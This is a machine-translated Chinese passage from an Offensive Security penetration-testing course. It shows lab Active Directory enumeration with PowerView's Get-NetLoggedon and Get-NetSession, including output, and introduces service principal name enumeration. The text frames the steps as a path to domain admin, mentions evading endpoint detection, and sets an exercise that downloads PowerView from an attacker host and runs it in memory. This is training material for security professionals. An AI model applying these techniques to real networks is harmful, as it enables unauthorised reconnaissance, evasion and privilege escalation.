<div style="position:absolute;top:21921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域管理员帐户。</font><font style="vertical-align: inherit;">但是，请记住，使用这两个 API 获得的结果</font></font></nobr></div>
<div style="position:absolute;top:21941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将根据登录用户的当前权限和配置而有所不同</font></font></nobr></div>
<div style="position:absolute;top:21960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域环境。</font></font></nobr></div>
<div style="position:absolute;top:21993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为一个非常基本的例子，在本节中，我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetWkstaUserEnum</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> API 来枚举本地</font></font></nobr></div>
<div style="position:absolute;top:22013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 客户端计算机和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetSessionEnum</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上的用户枚举用户的活动</font></font></nobr></div>
<div style="position:absolute;top:22032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器上的会话。</font></font></nobr></div>
<div style="position:absolute;top:22065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 PowerShell 调用操作系统 API 并不完全简单。</font><font style="vertical-align: inherit;">幸运的是，</font></font></nobr></div>
<div style="position:absolute;top:22084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他研究人员提出了一种技术，可以简化过程并有助于避免</font></font></nobr></div>
<div style="position:absolute;top:22103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端点安全检测。</font><font style="vertical-align: inherit;">最常见的解决方案是使用PowerView，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">628</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">个PowerShell</font></font></nobr></div>
<div style="position:absolute;top:22123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本，它是 PowerShell Empire 框架的一部分。</font></font></nobr></div>
<div style="position:absolute;top:22155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerView 脚本已存储在 Windows 上的 C:\Tools\active_directory 目录中</font></font></nobr></div>
<div style="position:absolute;top:22175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10 客户。</font><font style="vertical-align: inherit;">要使用它，我们必须首先导入它：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Tools\active_directory&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导入模块 .\PowerView.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:22229;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 683 - 安装和导入 PowerView</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerView 相当大，但我们只会使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-NetLoggedon</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-NetSession</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数，</font></font></nobr></div>
<div style="position:absolute;top:22278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别调用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetWkstaUserEnum</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetSessionEnum</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:22311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-NetLoggedon</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-ComputerName</font></font></b><font style="vertical-align: inherit;">枚举登录用户</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:22330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项来指定目标工作站或服务器。</font><font style="vertical-align: inherit;">因为在这种情况下，我们的目标是 Windows</font></font></nobr></div>
<div style="position:absolute;top:22349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10 客户端，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-ComputerName client251</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Tools\active_directory&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-NetLoggedon -ComputerName client251</font></font></font></b></nobr></div>
<div style="position:absolute;top:22418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wkui1_username wkui1_logon_domain wkui1_oth_domains wkui1_logon_server</font></font></nobr></div>
<div style="position:absolute;top:22435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------- ------------------ ----------------- - -----------------</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:22452;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">离场</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22452;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公司    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:22452;left:530"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DC01</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">离场    </font></font></nobr></div>
<div style="position:absolute;top:22469;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公司    </font></font></nobr></div>
<div style="position:absolute;top:22469;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DC01</font></font></nobr></div>
<div style="position:absolute;top:22486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CLIENT251$公司</font></font></nobr></div>
<div style="position:absolute;top:22503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CLIENT251$公司</font></font></nobr></div>
<div style="position:absolute;top:22520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CLIENT251$公司</font></font></nobr></div>
<div style="position:absolute;top:22537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CLIENT251$公司</font></font></nobr></div>
<div style="position:absolute;top:22554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CLIENT251$公司</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:22619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">628 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（@harmj0y，2017），https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:22747;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="20"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 20 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:22780;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:23857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:23857;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:23857;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">637</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CLIENT251$公司</font></font></nobr></div>
<div style="position:absolute;top:22892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CLIENT251$公司</font></font></nobr></div>
<div style="position:absolute;top:22909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CLIENT251$公司 </font></font></nobr></div>
<div style="position:absolute;top:22929;left:301"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 684 - 使用 Get-NetLoggedon 的用户枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出显示了预期的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">offsec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户帐户。</font></font></nobr></div>
<div style="position:absolute;top:22991;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们尝试检索域控制器 DC01 上的活动会话。</font><font style="vertical-align: inherit;">记住这些</font></font></nobr></div>
<div style="position:absolute;top:23010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话是在用户登录时针对域控制器执行的，但源自</font></font></nobr></div>
<div style="position:absolute;top:23030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定的工作站或服务器，这是我们试图列举的。</font></font></nobr></div>
<div style="position:absolute;top:23063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-ComputerName</font></font></b><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">以类似的方式</font><font style="vertical-align: inherit;">调用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-NetSession</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">。</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:23082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回想一下，这个函数调用 Win32 API </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetSessionEnum</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它将返回所有活动的</font></font></nobr></div>
<div style="position:absolute;top:23102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话，在我们的例子中来自域控制器。</font></font></nobr></div>
<div style="position:absolute;top:23134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 685 中，针对域控制器</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DC01</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用 API </font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:23169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Tools\active_directory&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-NetSession -ComputerName dc01</font></font></font></b></nobr></div>
<div style="position:absolute;top:23220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sesi10_cname sesi10_username sesi10_time sesi10_idle_time</font></font></nobr></div>
<div style="position:absolute;top:23237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------- --------------- ------------ ------------ ----</font></font></nobr></div>
<div style="position:absolute;top:23254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\\192.168.1.111 CLIENT251$    </font></font></nobr></div>
<div style="position:absolute;top:23254;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8    </font></font></nobr></div>
<div style="position:absolute;top:23254;left:587"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8</font></font></nobr></div>
<div style="position:absolute;top:23271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\\[::1] DC01$    </font></font></nobr></div>
<div style="position:absolute;top:23271;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6    </font></font></nobr></div>
<div style="position:absolute;top:23271;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:23288;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\\192.168.1.111 offsec</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:23288;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0    </font></font></nobr></div>
<div style="position:absolute;top:23288;left:587"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 </font></font></nobr></div>
<div style="position:absolute;top:23307;left:265"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 685 - 使用 Get-NetSession 枚举活动用户会话</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:23337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如预期的那样，Offsec 用户在来自 192.168.1.111 的域控制器上有一个活动会话</font></font></nobr></div>
<div style="position:absolute;top:23356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Windows 10 客户端）由于活动登录。</font><font style="vertical-align: inherit;">两个API获取的信息结束</font></font></nobr></div>
<div style="position:absolute;top:23375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">就像我们只针对一台机器一样，这也恰好是我们</font></font></nobr></div>
<div style="position:absolute;top:23395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在执行我们的脚本。</font><font style="vertical-align: inherit;">然而，在真实的 Active Directory 基础结构中，信息</font></font></nobr></div>
<div style="position:absolute;top:23414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用每个 API 获得的收益可能不同，而且肯定会更有帮助。</font></font></nobr></div>
<div style="position:absolute;top:23447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们可以枚举组成员身份并确定用户当前在哪些机器上</font></font></nobr></div>
<div style="position:absolute;top:23466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录后，我们就具备了开始破坏用户帐户所需的基本技能</font></font></nobr></div>
<div style="position:absolute;top:23486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获得域管理权限的最终目标。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:23520;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.4.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:23550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 下载并使用 PowerView 对学生 VM 执行相同的枚举</font></font></nobr></div>
<div style="position:absolute;top:23569;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Offsec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户</font><font style="vertical-align: inherit;">的上下文中</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:23598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jeff_Admin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">账号</font><font style="vertical-align: inherit;">登录学生VM，</font><font style="vertical-align: inherit;">进行远程桌面登录</font></font></nobr></div>
<div style="position:absolute;top:23617;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jeff_Admin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户</font><font style="vertical-align: inherit;">的域控制器</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">接下来，执行 Get-NetLoggedOn</font></font></nobr></div>
<div style="position:absolute;top:23636;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生 VM 上的函数以发现域控制器上的登录用户，同时在</font></font></nobr></div>
<div style="position:absolute;top:23656;left:145"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jeff_Admin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户的</font><font style="vertical-align: inherit;">上下文</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:23684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法</font><font style="vertical-align: inherit;">重复枚举</font></font></nobr></div>
<div style="position:absolute;top:23703;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System.Net.WebClient</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类以便从您的 Kali 系统下载 PowerView 和</font></font></nobr></div>
<div style="position:absolute;top:23723;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在内存中执行它而不将它保存到硬盘。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:23935;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="21"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 21 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:23968;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:25045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:25045;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:25045;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">638</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:24064;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.5</font></font></i></nobr></div>
<div style="position:absolute;top:24064;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过服务主体名称枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:24102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到目前为止，我们已经枚举了域用户来搜索属于</font></font></nobr></div>
<div style="position:absolute;top:24121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高价值群体。</font><font style="vertical-align: inherit;">攻击域用户帐户的另一种方法是针对所谓的服务</font></font></nobr></div>
<div style="position:absolute;top:24140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">账户</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">629</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，也可能是高价值群体的成员。</font></font></nobr></div>
<div style="position:absolute;top:24173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行应用程序时，它必须始终在操作系统用户的上下文中执行。</font></font></nobr></div>
<div style="position:absolute;top:24193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果用户启动应用程序，则该用户帐户定义上下文。</font><font style="vertical-align: inherit;">然而，服务</font></font></nobr></div>
<div style="position:absolute;top:24212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统本身启动使用基于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务帐户</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的上下文</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:24245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">换句话说，隔离的应用程序可以使用一组预定义的服务帐户：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LocalSystem</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">630</font></font></font></nobr></div>
<div style="position:absolute;top:24264;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LocalService</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">631</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetworkService</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">632</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于更复杂的应用程序，域用户帐户</font></font></nobr></div>
<div style="position:absolute;top:24284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用于提供所需的上下文，同时仍然可以访问域内的资源。</font></font></nobr></div>
<div style="position:absolute;top:24317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当 Exchange、SQL 或 Internet 信息服务 (IIS) 等应用程序集成到</font></font></nobr></div>
<div style="position:absolute;top:24336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory，称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务主体名称</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(SPN) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">633</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的唯一服务实例标识符</font><font style="vertical-align: inherit;">是</font></font></nobr></div>
<div style="position:absolute;top:24355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于将特定服务器上的服务与 Active Directory 中的服务帐户相关联。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:24417;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Server 2008 R2 中引入的</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">634 个</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">托管服务帐户</font><font style="vertical-align: inherit;">是</font></font></i></nobr></div>
<div style="position:absolute;top:24436;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专为需要与 Active 更紧密集成的复杂应用而设计</font></font></i></nobr></div>
<div style="position:absolute;top:24456;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录。</font><font style="vertical-align: inherit;">SQL 和 Microsoft Exchange </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">635</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等较大的应用程序</font><font style="vertical-align: inherit;">通常需要</font></font></i></nobr></div>
<div style="position:absolute;top:24475;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行时服务器冗余以保证可用性，但托管服务</font></font></i></nobr></div>
<div style="position:absolute;top:24494;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户不能支持这一点。</font><font style="vertical-align: inherit;">为了解决这个问题，Group Managed Service</font></font></i></nobr></div>
<div style="position:absolute;top:24514;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">636</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是在 Windows Server 2012 中引入的，但这需要</font></font></i></nobr></div>
<div style="position:absolute;top:24533;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器运行 Windows Server 2012 或更高版本。</font><font style="vertical-align: inherit;">正因为如此，许多</font></font></i></nobr></div>
<div style="position:absolute;top:24553;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织仍然依赖基本的服务帐户。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:24615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过枚举域中所有注册的SPN，我们可以获取IP地址和端口号</font></font></nobr></div>
<div style="position:absolute;top:24634;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在与目标 Active Directory 集成的服务器上运行的应用程序的数量，限制了对</font></font></nobr></div>
<div style="position:absolute;top:24653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">广泛的端口扫描。</font></font></nobr></div>
<div style="position:absolute;top:24686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于信息已注册并存储在 Active Directory 中，因此它存在于域中</font></font></nobr></div>
<div style="position:absolute;top:24705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制器。</font><font style="vertical-align: inherit;">为了获取数据，我们将再次查询域控制器以搜索特定服务</font></font></nobr></div>
<div style="position:absolute;top:24725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主要名称。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:24827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">629 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2017 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/ms686005 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:24847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">630 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/ms684190 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:24867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">631 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/ms684188 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
